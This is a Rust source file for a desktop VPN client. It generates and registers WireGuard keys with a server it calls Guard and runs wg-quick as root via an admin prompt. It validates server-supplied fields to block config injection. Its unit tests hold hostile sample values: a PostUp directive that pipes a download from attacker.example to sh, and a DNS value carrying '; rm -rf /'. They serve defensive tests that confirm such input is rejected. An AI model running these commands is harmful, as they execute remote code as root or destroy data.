//! WireGuard: key generation, registration, and tunnel up/down + status.
//!
//! The desktop generates its WireGuard keypair with the `wg` CLI and keeps the
//! private key in the OS keychain (like the device signing key — it never leaves
//! the machine). Only the public key is sent to Guard.
//!
//! Registration is signed with the device's ed25519 *Guard* key (RFC 9421); the
//! WireGuard public key rides inside that signed request (bound via
//! Content-Digest), so Guard authenticates the device and the key can't be
//! swapped in transit.
//!
//! Bringing the tunnel up/down uses `wg-quick`, which needs root — on macOS we
//! run it through the native admin prompt (`osascript … with administrator
//! privileges`). Status/ping don't need root: we ping the in-tunnel gateway,
//! which only answers when the tunnel is actually up.

use std::io::Write;
use std::process::{Command, Stdio};
use std::time::{SystemTime, UNIX_EPOCH};

use base64::{engine::general_purpose, Engine as _};
use ed25519_dalek::Signer;
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};

use crate::auth::{error_chain, load_or_create_signing_key, KEYCHAIN_SERVICE};

/// OS keychain account for the device's WireGuard private key.
const WG_KEYCHAIN_ACCOUNT: &str = "wireguard-private-key";

/// The path (and covered `@path`) of the registration endpoint.
const REGISTER_PATH: &str = "/guard/api/wireguard/register";

/// WireGuard interface / config name used on this machine.
const TUNNEL_NAME: &str = "guard";

/// Tunnel details Guard returns so the client can build its WireGuard config.
#[derive(Serialize, Deserialize, Clone)]
pub struct WireguardRegistration {
    /// The tunnel address Guard allocated to this device (e.g. "10.8.0.2").
    pub address: Option<String>,
    /// The server's WireGuard public key.
    pub server_public_key: Option<String>,
    /// The server's in-tunnel address (the gateway we ping for health).
    pub server_address: Option<String>,
    /// The "host:port" to dial (Peer Endpoint).
    pub endpoint: Option<String>,
    /// What to route through the tunnel (Peer AllowedIPs).
    pub allowed_ips: Option<String>,
    pub dns: Option<String>,
    pub persistent_keepalive: Option<u32>,
}

/// Live tunnel status, derived from a ping to the in-tunnel gateway.
#[derive(Serialize, Clone)]
pub struct WireguardStatus {
    pub connected: bool,
    /// Round-trip time to the gateway in milliseconds, when connected.
    pub ping_ms: Option<u32>,
}

/// Generate the device's WireGuard keypair (or reuse the stored one) and register
/// its public key with Guard, authenticated as `device_id`. Returns the tunnel
/// parameters; does not bring the tunnel up.
#[tauri::command]
pub async fn register_wireguard(host: String, device_id: String) -> Result<WireguardRegistration, String> {
    let private_key = load_or_create_wireguard_private_key()?;
    let public_key = wg_pubkey(&private_key)?;

    // The signed body carries the public key.
    let body = serde_json::json!({ "public_key": public_key }).to_string();
    let content_digest = format!(
        "sha-256=:{}:",
        general_purpose::STANDARD.encode(Sha256::digest(body.as_bytes()))
    );

    // Build the RFC 9421 signature base. Covered components and formatting must
    // match the server's verifier (http_signature.rs::build_base): `@authority`
    // is lowercased, an absent query is the literal "?", and `content-digest`
    // binds the body (and thus the public key) to the signature.
    let created = now_secs();
    let authority = host.to_lowercase();
    let params_raw = format!(
        "(\"@method\" \"@authority\" \"@path\" \"@query\" \"content-digest\");created={};keyid=\"{}\";alg=\"ed25519\"",
        created, device_id
    );
    let base = format!(
        "\"@method\": POST\n\"@authority\": {}\n\"@path\": {}\n\"@query\": ?\n\"content-digest\": {}\n\"@signature-params\": {}",
        authority, REGISTER_PATH, content_digest, params_raw
    );

    let signing_key = load_or_create_signing_key()?;
    let signature = signing_key.sign(base.as_bytes());
    let signature_input = format!("sig1={}", params_raw);
    let signature_header = format!("sig1=:{}:", general_purpose::STANDARD.encode(signature.to_bytes()));

    let client = reqwest::Client::builder()
        // Dev instances use self-signed certs; accept them only in debug builds.
        .danger_accept_invalid_certs(cfg!(debug_assertions))
        .build()
        .map_err(|e| format!("Could not build HTTP client: {e}"))?;

    let response = client
        .post(format!("https://{host}{REGISTER_PATH}"))
        .header("Content-Type", "application/json")
        .header("Content-Digest", &content_digest)
        .header("Signature-Input", &signature_input)
        .header("Signature", &signature_header)
        .body(body)
        .send()
        .await
        .map_err(|e| format!("WireGuard registration request failed: {}", error_chain(e)))?;

    if response.status().is_success() == false {
        let status = response.status();
        let text = response.text().await.unwrap_or_default();
        return Err(format!("WireGuard registration failed ({status}): {text}"));
    }

    response
        .json::<WireguardRegistration>()
        .await
        .map_err(|e| format!("Invalid registration response: {e}"))
}

/// Register (idempotent) and bring the tunnel up. Returns the tunnel parameters
/// so the UI can show accurate endpoint/address/gateway.
#[tauri::command]
pub async fn wireguard_connect(host: String, device_id: String) -> Result<WireguardRegistration, String> {
    let registration = register_wireguard(host, device_id).await?;

    let private_key = load_or_create_wireguard_private_key()?;
    let config = build_tunnel_config(&private_key, &registration)?;

    // Write the config (with the private key) to a temp file the app owns, then
    // move it into place and bring the tunnel up as root in one prompt. `install`
    // sets 0600 root ownership; we bring any stale tunnel down first so connect
    // is idempotent.
    let tmp_path = std::env::temp_dir().join("guard-wg.conf");
    std::fs::write(&tmp_path, config).map_err(|e| format!("Could not write tunnel config: {e}"))?;
    let tmp = tmp_path.to_string_lossy().to_string();

    let script = format!(
        "mkdir -p /etc/wireguard && install -m 600 '{tmp}' /etc/wireguard/{name}.conf && ({wg_quick} down {name} >/dev/null 2>&1 || true) && {wg_quick} up {name}",
        tmp = tmp,
        name = TUNNEL_NAME,
        wg_quick = "wg-quick",
    );
    let result = run_privileged(&script).await;
    // The temp file held the private key — remove it regardless of the outcome.
    let _ = std::fs::remove_file(&tmp_path);
    result?;

    Ok(registration)
}

/// Bring the tunnel down.
#[tauri::command]
pub async fn wireguard_disconnect() -> Result<(), String> {
    run_privileged(&format!("wg-quick down {name}", name = TUNNEL_NAME)).await?;
    Ok(())
}

/// Report whether the tunnel is up by pinging the in-tunnel gateway. A reply
/// means the tunnel is carrying traffic; the round-trip time is the ping shown
/// in the UI. `gateway` is the server's in-tunnel address (server_address).
#[tauri::command]
pub async fn wireguard_status(gateway: Option<String>) -> WireguardStatus {
    // The gateway reaches us from Guard via the UI. Validate it is an IP before
    // handing it to `ping` so a hostile value can't be read as an argument.
    let gateway = match gateway.as_deref().map(|g| parse_ipv4(g, "server_address")) {
        Some(Ok(gateway)) => gateway,
        _ => return WireguardStatus { connected: false, ping_ms: None },
    };

    match ping(&gateway).await {
        Some(ms) => WireguardStatus { connected: true, ping_ms: Some(ms) },
        None => WireguardStatus { connected: false, ping_ms: None },
    }
}

/// Build a wg-quick config from the device's private key + Guard's parameters.
///
/// SECURITY: every value here arrives from the network (Guard's registration
/// response) and the finished file is handed to `wg-quick up` as root. wg-quick
/// configs support PreUp/PostUp/PreDown/PostDown, which it executes via bash, so
/// a value containing a newline could append a directive that runs as root. Each
/// field is therefore *parsed* into a known-good shape rather than sanitised, and
/// anything that does not parse aborts the connection. Nothing reaches the file
/// until it has been validated.
fn build_tunnel_config(private_key: &str, reg: &WireguardRegistration) -> Result<String, String> {
    let address = parse_ipv4(
        reg.address.as_deref().ok_or_else(|| "Registration is missing the tunnel address.".to_string())?,
        "address",
    )?;
    let server_public_key = parse_wg_key(
        reg.server_public_key.as_deref().ok_or_else(|| "Registration is missing the server public key.".to_string())?,
    )?;
    let endpoint = parse_endpoint(
        reg.endpoint.as_deref().ok_or_else(|| "Registration is missing the server endpoint.".to_string())?,
    )?;
    let allowed_ips = parse_cidr_list(reg.allowed_ips.as_deref().unwrap_or("0.0.0.0/0"))?;
    let dns = match reg.dns.as_deref() {
        Some(dns) => Some(parse_dns_list(dns)?),
        None => None,
    };

    let mut config = String::from("[Interface]\n");
    config.push_str(&format!("PrivateKey = {}\n", private_key));
    config.push_str(&format!("Address = {}/32\n", address));
    if let Some(dns) = dns {
        config.push_str(&format!("DNS = {}\n", dns));
    }
    config.push_str("\n[Peer]\n");
    config.push_str(&format!("PublicKey = {}\n", server_public_key));
    config.push_str(&format!("Endpoint = {}\n", endpoint));
    config.push_str(&format!("AllowedIPs = {}\n", allowed_ips));
    // persistent_keepalive is a u32, so it cannot carry anything but digits.
    if let Some(keepalive) = reg.persistent_keepalive {
        config.push_str(&format!("PersistentKeepalive = {}\n", keepalive));
    }
    Ok(config)
}

/// An IPv4 address, re-rendered from the parsed value so only canonical output
/// reaches the config.
fn parse_ipv4(value: &str, field: &str) -> Result<String, String> {
    value
        .trim()
        .parse::<std::net::Ipv4Addr>()
        .map(|ip| ip.to_string())
        .map_err(|_| format!("Guard returned an invalid {field} ('{value}'); refusing to build the tunnel."))
}

/// A WireGuard key: base64 over exactly 32 bytes. Same check Guard applies to
/// keys it accepts, so a malformed server key can never reach the config.
fn parse_wg_key(value: &str) -> Result<String, String> {
    let value = value.trim();
    match general_purpose::STANDARD.decode(value) {
        Ok(bytes) if bytes.len() == 32 => Ok(value.to_string()),
        _ => Err("Guard returned an invalid server public key; refusing to build the tunnel.".to_string()),
    }
}

/// A peer endpoint: "host:port", where host is an IP or a hostname and port is a
/// u16. Rejects anything else, including embedded whitespace or newlines.
fn parse_endpoint(value: &str) -> Result<String, String> {
    let value = value.trim();
    let invalid = || format!("Guard returned an invalid endpoint ('{value}'); refusing to build the tunnel.");
    // rsplit_once so IPv6 literals in brackets ("[::1]:51820") still split on the
    // port separator rather than an address colon.
    let (host, port) = value.rsplit_once(':').ok_or_else(invalid)?;
    port.parse::<u16>().map_err(|_| invalid())?;
    if host.is_empty() {
        return Err(invalid());
    }
    let host_inner = host.strip_prefix('[').and_then(|h| h.strip_suffix(']')).unwrap_or(host);
    let is_ip = host_inner.parse::<std::net::IpAddr>().is_ok();
    // Hostname: letters, digits, dot and hyphen only. This is what excludes
    // whitespace, newlines and shell metacharacters.
    let is_hostname = host.chars().all(|c| c.is_ascii_alphanumeric() || c == '.' || c == '-')
        && host.starts_with('-') == false;
    if is_ip == false && is_hostname == false {
        return Err(invalid());
    }
    Ok(value.to_string())
}

/// A comma-separated AllowedIPs list, every entry an "addr/prefix" CIDR.
fn parse_cidr_list(value: &str) -> Result<String, String> {
    let invalid = || format!("Guard returned invalid allowed_ips ('{value}'); refusing to build the tunnel.");
    let mut entries: Vec<String> = Vec::new();
    for part in value.split(',') {
        let part = part.trim();
        if part.is_empty() {
            continue;
        }
        let (addr, prefix) = part.rsplit_once('/').ok_or_else(invalid)?;
        let addr_inner = addr.strip_prefix('[').and_then(|a| a.strip_suffix(']')).unwrap_or(addr);
        let ip: std::net::IpAddr = addr_inner.parse().map_err(|_| invalid())?;
        let prefix: u32 = prefix.parse().map_err(|_| invalid())?;
        let max = if ip.is_ipv4() { 32 } else { 128 };
        if prefix > max {
            return Err(invalid());
        }
        entries.push(format!("{ip}/{prefix}"));
    }
    if entries.is_empty() {
        return Err(invalid());
    }
    Ok(entries.join(", "))
}

/// A comma-separated DNS list, every entry a bare IP address.
fn parse_dns_list(value: &str) -> Result<String, String> {
    let invalid = || format!("Guard returned an invalid dns value ('{value}'); refusing to build the tunnel.");
    let mut entries: Vec<String> = Vec::new();
    for part in value.split(',') {
        let part = part.trim();
        if part.is_empty() {
            continue;
        }
        let ip: std::net::IpAddr = part.parse().map_err(|_| invalid())?;
        entries.push(ip.to_string());
    }
    if entries.is_empty() {
        return Err(invalid());
    }
    Ok(entries.join(", "))
}

/// Run a shell command as root via the macOS admin prompt. PATH is extended to
/// the common Homebrew locations because `do shell script` starts with a minimal
/// PATH that doesn't include `wg-quick`.
async fn run_privileged(shell_command: &str) -> Result<(), String> {
    let with_path = format!("export PATH=/opt/homebrew/bin:/usr/local/bin:$PATH; {shell_command}");
    // Escape for embedding inside an AppleScript double-quoted string.
    let escaped = with_path.replace('\\', "\\\\").replace('"', "\\\"");
    let script = format!("do shell script \"{}\" with administrator privileges", escaped);

    let output = tokio::process::Command::new("osascript")
        .arg("-e")
        .arg(script)
        .output()
        .await
        .map_err(|e| format!("Could not run osascript: {e}"))?;

    if output.status.success() == false {
        let stderr = String::from_utf8_lossy(&output.stderr);
        // The user cancelling the auth dialog is a normal outcome, not an error to shout about.
        if stderr.contains("User canceled") {
            return Err("Authorization cancelled.".to_string());
        }
        return Err(format!("Tunnel command failed: {}", stderr.trim()));
    }
    Ok(())
}

/// Ping a host once (2s timeout) and return the round-trip time in ms.
async fn ping(host: &str) -> Option<u32> {
    let output = tokio::process::Command::new("ping")
        .args(["-c", "1", "-t", "2", host])
        .output()
        .await
        .ok()?;
    if output.status.success() == false {
        return None;
    }
    // Parse "time=27.123 ms" from the ping output.
    let stdout = String::from_utf8_lossy(&output.stdout);
    let ms: f64 = stdout.split("time=").nth(1)?.split_whitespace().next()?.parse().ok()?;
    Some(ms.round() as u32)
}

/// Load the device's WireGuard private key from the keychain, creating one via
/// `wg genkey` on first use.
fn load_or_create_wireguard_private_key() -> Result<String, String> {
    let entry = keyring::Entry::new(KEYCHAIN_SERVICE, WG_KEYCHAIN_ACCOUNT)
        .map_err(|e| format!("Keychain unavailable: {e}"))?;

    match entry.get_password() {
        Ok(private_key) => Ok(private_key),
        Err(keyring::Error::NoEntry) => {
            let private_key = wg_genkey()?;
            entry
                .set_password(&private_key)
                .map_err(|e| format!("Could not store WireGuard key in keychain: {e}"))?;
            Ok(private_key)
        }
        Err(e) => Err(format!("Keychain error: {e}")),
    }
}

/// `wg genkey` — a new base64 private key.
fn wg_genkey() -> Result<String, String> {
    let output = Command::new("wg")
        .arg("genkey")
        .output()
        .map_err(|e| format!("Could not run 'wg genkey' (is wireguard-tools installed?): {e}"))?;
    if output.status.success() == false {
        return Err(format!("'wg genkey' failed: {}", String::from_utf8_lossy(&output.stderr).trim()));
    }
    Ok(String::from_utf8_lossy(&output.stdout).trim().to_string())
}

/// `wg pubkey` — derive the public key from a private key fed on stdin.
fn wg_pubkey(private_key: &str) -> Result<String, String> {
    let mut child = Command::new("wg")
        .arg("pubkey")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .map_err(|e| format!("Could not run 'wg pubkey': {e}"))?;

    // Write the private key, then close stdin so `wg` emits the public key.
    let mut stdin = child.stdin.take().ok_or_else(|| "Failed to open 'wg pubkey' stdin.".to_string())?;
    stdin
        .write_all(private_key.as_bytes())
        .map_err(|e| format!("Failed to write to 'wg pubkey': {e}"))?;
    drop(stdin);

    let output = child
        .wait_with_output()
        .map_err(|e| format!("Failed to read 'wg pubkey' output: {e}"))?;
    if output.status.success() == false {
        return Err(format!("'wg pubkey' failed: {}", String::from_utf8_lossy(&output.stderr).trim()));
    }
    Ok(String::from_utf8_lossy(&output.stdout).trim().to_string())
}

fn now_secs() -> i64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs() as i64)
        .unwrap_or(0)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn reg() -> WireguardRegistration {
        WireguardRegistration {
            address: Some("10.8.0.2".to_string()),
            // 32 zero bytes, base64 — a structurally valid WireGuard key.
            server_public_key: Some("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=".to_string()),
            server_address: Some("10.8.0.1".to_string()),
            endpoint: Some("vpn.example.com:51820".to_string()),
            allowed_ips: Some("10.8.0.0/24".to_string()),
            dns: Some("1.1.1.1".to_string()),
            persistent_keepalive: Some(25),
        }
    }

    #[test]
    fn builds_a_valid_config() {
        let config = build_tunnel_config("PRIVKEY", &reg()).expect("should build");
        assert!(config.contains("Address = 10.8.0.2/32"));
        assert!(config.contains("PublicKey = AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="));
        assert!(config.contains("Endpoint = vpn.example.com:51820"));
        assert!(config.contains("AllowedIPs = 10.8.0.0/24"));
        assert!(config.contains("DNS = 1.1.1.1"));
        assert!(config.contains("PersistentKeepalive = 25"));
    }

    // The vulnerability: a newline in any server-supplied field could append a
    // PostUp directive, which wg-quick runs as root. Every field must refuse.
    #[test]
    fn rejects_postup_injection_in_every_field() {
        let payload = "\nPostUp = curl -s https://attacker.example/p | sh";

        let cases: Vec<(&str, Box<dyn Fn(&mut WireguardRegistration)>)> = vec![
            ("dns", Box::new(|r: &mut WireguardRegistration| r.dns = Some(format!("1.1.1.1{}", payload)))),
            ("allowed_ips", Box::new(|r: &mut WireguardRegistration| r.allowed_ips = Some(format!("0.0.0.0/0{}", payload)))),
            ("endpoint", Box::new(|r: &mut WireguardRegistration| r.endpoint = Some(format!("vpn.example.com:51820{}", payload)))),
            ("address", Box::new(|r: &mut WireguardRegistration| r.address = Some(format!("10.8.0.2{}", payload)))),
            ("server_public_key", Box::new(|r: &mut WireguardRegistration| {
                r.server_public_key = Some(format!("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA={}", payload))
            })),
        ];

        for (field, mutate) in cases {
            let mut registration = reg();
            mutate(&mut registration);
            let result = build_tunnel_config("PRIVKEY", &registration);
            assert!(result.is_err(), "{field} accepted an injected PostUp directive");
            // Belt and braces: nothing that parses must ever emit PostUp.
            if let Ok(config) = result {
                assert!(config.contains("PostUp") == false, "{field} leaked PostUp into the config");
            }
        }
    }

    #[test]
    fn rejects_malformed_values() {
        for mutate in [
            |r: &mut WireguardRegistration| r.address = Some("not-an-ip".to_string()),
            |r: &mut WireguardRegistration| r.server_public_key = Some("tooshort".to_string()),
            |r: &mut WireguardRegistration| r.endpoint = Some("vpn.example.com".to_string()),
            |r: &mut WireguardRegistration| r.endpoint = Some("vpn.example.com:notaport".to_string()),
            |r: &mut WireguardRegistration| r.endpoint = Some("vpn.example.com:51820 extra".to_string()),
            |r: &mut WireguardRegistration| r.allowed_ips = Some("10.8.0.0/99".to_string()),
            |r: &mut WireguardRegistration| r.allowed_ips = Some("10.8.0.0".to_string()),
            |r: &mut WireguardRegistration| r.dns = Some("8.8.8.8; rm -rf /".to_string()),
        ] {
            let mut registration = reg();
            mutate(&mut registration);
            assert!(build_tunnel_config("PRIVKEY", &registration).is_err());
        }
    }

    #[test]
    fn accepts_canonical_multi_value_lists() {
        let mut registration = reg();
        registration.allowed_ips = Some("10.8.0.0/24, 192.168.1.0/24".to_string());
        registration.dns = Some("1.1.1.1, 8.8.8.8".to_string());
        let config = build_tunnel_config("PRIVKEY", &registration).expect("should build");
        assert!(config.contains("AllowedIPs = 10.8.0.0/24, 192.168.1.0/24"));
        assert!(config.contains("DNS = 1.1.1.1, 8.8.8.8"));
    }

    #[test]
    fn accepts_ipv6_endpoint_and_allowed_ips() {
        let mut registration = reg();
        registration.endpoint = Some("[2001:db8::1]:51820".to_string());
        registration.allowed_ips = Some("::/0".to_string());
        assert!(build_tunnel_config("PRIVKEY", &registration).is_ok());
    }
}
